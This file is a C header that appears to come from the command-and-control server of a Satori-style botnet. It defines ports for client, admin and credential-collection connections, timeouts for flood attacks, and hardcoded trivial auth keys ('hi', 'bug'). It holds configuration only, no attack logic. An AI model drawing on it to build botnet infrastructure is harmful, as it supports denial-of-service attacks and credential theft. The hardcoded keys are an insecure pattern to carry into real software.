#pragma once

#include <stdint.h>

#include "def.h"

enum
{
    TRUE = 1,
    FALSE = 0,
    MAX_EVENTS = 1000000,
    TIMEOUT = 400,
    VERIFY_TIMEOUT = 15,
    FLOOD_TIMEOUT = 30,
    ADMIN_TIMEOUT = 10,
    CLIENT_PORT = 61002,
    ADMIN_PORT = 1337,
    CRED_PORT = 7685,
};

static int client_fd = -1;
static int admin_fd = -1;
static int efd = -1;

/* Satori Utils */

static int cred_fd = -1;

#define MANAGER_AUTH_KEY "hi"
#define ADMIN_AUTH_KEY "bug"
